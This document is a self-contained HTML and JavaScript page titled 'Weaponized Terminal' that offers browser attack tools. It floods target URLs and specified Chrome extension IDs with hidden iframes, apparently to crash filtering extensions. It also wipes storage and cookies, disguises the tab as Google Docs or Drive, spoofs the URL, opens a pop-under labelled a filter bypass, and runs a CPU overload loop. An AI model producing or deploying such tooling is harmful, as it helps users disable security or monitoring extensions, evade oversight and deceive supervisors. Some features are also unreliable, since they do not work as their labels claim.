<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>⚡ Weaponized Terminal ⚡</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
    body {
        margin: 0;
        background: #000;
        color: #00FF00;
        font-family: 'Courier New', Courier, monospace;
        overflow-x: hidden;
    }
    #terminal {
        padding: 20px;
    }
    .prompt {
        color: #0f0;
        font-weight: bold;
    }
    input, select, button, textarea {
        background: #000;
        color: #0f0;
        border: 1px solid #0f0;
        padding: 5px;
        margin: 5px 0;
        width: 100%;
        font-family: 'Courier New', Courier, monospace;
    }
    button {
        font-weight: bold;
        cursor: pointer;
    }
    button:hover {
        background: #0f0;
        color: #000;
    }
    .hidden {
        display: none;
    }
    iframe {
        position: absolute;
        width: 1px;
        height: 1px;
        opacity: 0;
        pointer-events: none;
    }
    .section {
        margin-top: 20px;
        padding: 10px;
        border: 1px dashed #0f0;
    }
</style>
</head>
<body>

<div id="terminal">
    <div id="bootSequence"></div>
    <div id="mainMenu" class="hidden">
        <div class="prompt">Select Your Weapon:</div>
        <button onclick="openSection('attack')">[1] Extension Flood & Bug</button>
        <button onclick="openSection('history')">[2] History Nuker</button>
        <button onclick="openSection('cloak')">[3] Cloak & Fake URL</button>
        <button onclick="openSection('unblock')">[4] Tab Unblocker</button>
        <button onclick="openSection('overload')">[5] CPU Overload</button>
        <button onclick="nukeAll()">[6] NUKE ALL</button>
        <button onclick="safeExit()">[X] Safe Exit</button>
    </div>

    <div id="attack" class="section hidden">
        <div class="prompt">Extension Flood & Bugging</div>
        <textarea id="attackUrls" placeholder="Enter Target URLs (comma separated)">https://example.com</textarea>
        <input type="number" id="iframeCount" placeholder="Iframes per Cycle" value="100">
        <input type="number" id="iframeDelay" placeholder="Delay Between Waves (ms)" value="50">
        <select id="floodMode">
            <option value="turbo">Turbo</option>
            <option value="aggressive">Aggressive</option>
            <option value="silent">Silent Hidden</option>
        </select>
        <textarea id="manualExtensions" placeholder="Enter Extension IDs (one per line)"></textarea>
        <button onclick="startFlood()">Start Attack</button>
        <button onclick="stopFlood()">Stop Attack</button>
        <div id="attackStatus" class="prompt">Status: Idle</div>
    </div>

    <div id="history" class="section hidden">
        <div class="prompt">History Nuker</div>
        <button onclick="startHistoryWipe()">Start Wipe</button>
        <button onclick="stopHistoryWipe()">Stop Wipe</button>
        <div id="historyStatus" class="prompt">Status: Idle</div>
    </div>

    <div id="cloak" class="section hidden">
        <div class="prompt">Cloaking & URL Spoof</div>
        <select id="cloakType">
            <option value="docs">Google Docs</option>
            <option value="drive">Google Drive</option>
            <option value="calc">Calculator</option>
            <option value="custom">Custom</option>
        </select>
        <input type="text" id="cloakCustom" placeholder="Custom Title/URL (if selected)">
        <button onclick="applyCloak()">Apply Cloak</button>
    </div>

    <div id="unblock" class="section hidden">
        <div class="prompt">Tab Unblocker (Bypass Filters)</div>
        <button onclick="launchUnblocker()">Launch Unblocker</button>
    </div>

    <div id="overload" class="section hidden">
        <div class="prompt">CPU Overload</div>
        <button onclick="startOverload()">Start CPU Crash</button>
        <button onclick="stopOverload()">Stop CPU Crash</button>
        <div id="overloadStatus" class="prompt">Status: Idle</div>
    </div>
</div>

<script>
let floodInterval, iframeCount = 100, iframeDelay = 50, floodMode = 'turbo', attackUrls = [], manualExtensions = [], overloadInterval;
let historyInterval;

// Terminal boot effect
const bootLines = [
    "Initializing Weaponized Terminal...",
    "Loading core modules...",
    "Loading extension flooding systems...",
    "Loading iframe bombardment engine...",
    "Loading cloaking and spoofing protocols...",
    "Finalizing build...",
    "Ready."
];

let currentLine = 0;
function bootSequence() {
    if (currentLine < bootLines.length) {
        document.getElementById('bootSequence').innerHTML += `<div>> ${bootLines[currentLine]}</div>`;
        currentLine++;
        setTimeout(bootSequence, 500);
    } else {
        document.getElementById('mainMenu').classList.remove('hidden');
    }
}
bootSequence();

function openSection(id) {
    document.querySelectorAll('.section').forEach(sec => sec.classList.add('hidden'));
    document.getElementById(id).classList.remove('hidden');
}

function startFlood() {
    stopFlood();
    iframeCount = +document.getElementById('iframeCount').value;
    iframeDelay = +document.getElementById('iframeDelay').value;
    floodMode = document.getElementById('floodMode').value;
    attackUrls = document.getElementById('attackUrls').value.split(',').map(x=>x.trim());
    manualExtensions = document.getElementById('manualExtensions').value.split('\n').map(x=>x.trim()).filter(x=>x);

    document.getElementById('attackStatus').innerText = 'Status: Flooding...';

    floodInterval = setInterval(()=>{
        attackUrls.forEach(url => spawnIframe(url));
        manualExtensions.forEach(id => spawnExtIframe(id));
    }, iframeDelay);
}

function stopFlood() {
    clearInterval(floodInterval);
    document.getElementById('attackStatus').innerText = 'Status: Idle';
}

function spawnIframe(url) {
    const iframe = document.createElement('iframe');
    iframe.src = url + "?rand=" + Math.random();
    iframe.style.width = (floodMode === "turbo") ? "100%" : (floodMode === "aggressive" ? "10px" : "1px");
    iframe.style.height = (floodMode === "turbo") ? "100%" : (floodMode === "aggressive" ? "10px" : "1px");
    iframe.style.visibility = (floodMode === "silent") ? "hidden" : "visible";
    document.body.appendChild(iframe);
    setTimeout(()=>iframe.remove(), 1000);
}

function spawnExtIframe(id) {
    const iframe = document.createElement('iframe');
    iframe.src = `chrome-extension://${id}/`;
    document.body.appendChild(iframe);
    setTimeout(()=>iframe.remove(), 1000);
}

function startHistoryWipe() {
    stopHistoryWipe();
    historyInterval = setInterval(clearHistory, 1000);
    document.getElementById('historyStatus').innerText = 'Status: Wiping...';
}

function stopHistoryWipe() {
    clearInterval(historyInterval);
    document.getElementById('historyStatus').innerText = 'Status: Idle';
}

function clearHistory() {
    localStorage.clear();
    sessionStorage.clear();
    document.cookie.split(";").forEach(c=>{
        document.cookie = c.replace(/^ +/,"").replace(/=.*/,"=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/");
    });
}

function applyCloak() {
    const type = document.getElementById('cloakType').value;
    const custom = document.getElementById('cloakCustom').value.trim();
    let title = 'Untitled';
    let favicon = '';

    switch(type) {
        case 'docs':
            title = 'Google Docs';
            favicon = 'https://ssl.gstatic.com/docs/doclist/images/mediatype/icon_1_document_x16.png';
            break;
        case 'drive':
            title = 'Google Drive';
            favicon = 'https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_48dp.png';
            break;
        case 'calc':
            title = 'Calculator';
            favicon = 'https://ssl.gstatic.com/classroom/ic_product_calculator_48.png';
            break;
        case 'custom':
            title = custom || 'Custom';
            break;
    }
    document.title = title;
    const link = document.createElement('link');
    link.rel = 'icon';
    link.href = favicon || '';
    document.head.appendChild(link);

    if (type === 'custom' && custom) {
        history.pushState({}, '', custom);
    }
}

function launchUnblocker() {
    const win = window.open('https://bing.com', '_blank');
    win.blur();
    window.focus();
}

function startOverload() {
    overloadInterval = setInterval(()=>{
        for (let i=0; i<100; i++) {
            Math.random()*Math.random();
        }
    },1);
    document.getElementById('overloadStatus').innerText = 'Status: Overloading CPU...';
}

function stopOverload() {
    clearInterval(overloadInterval);
    document.getElementById('overloadStatus').innerText = 'Status: Idle';
}

function nukeAll() {
    startFlood();
    startHistoryWipe();
    startOverload();
    alert('NUKE ALL ACTIVATED');
}

function safeExit() {
    stopFlood();
    stopHistoryWipe();
    stopOverload();
    document.querySelectorAll('iframe').forEach(f=>f.remove());
    alert('Safe Exit Complete.');
}
</script>

</body>
</html>
